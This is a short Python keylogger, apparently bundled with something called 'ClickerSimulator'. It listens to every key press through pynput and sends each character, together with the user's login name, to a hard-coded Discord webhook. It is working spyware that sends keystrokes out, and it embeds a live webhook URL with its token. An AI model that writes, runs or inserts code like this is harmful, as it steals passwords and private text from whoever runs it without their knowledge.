import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "ClickerSimulator", "Libraries"))

from pynput import keyboard
from dhooks import Webhook

hook = Webhook("https://discord.com/api/webhooks/1404239400954757141/usVopTBPi9bfAUMhLUBVrA9U9hBp1wtNXkeMeovkIuolbabeOtstAEp7eEsZH_T1opcc")

user = os.getlogin()

def on_press(key):
    try:
        hook.send(f"Key pressed: {key.char} from user: {user}")
        print(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")


with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
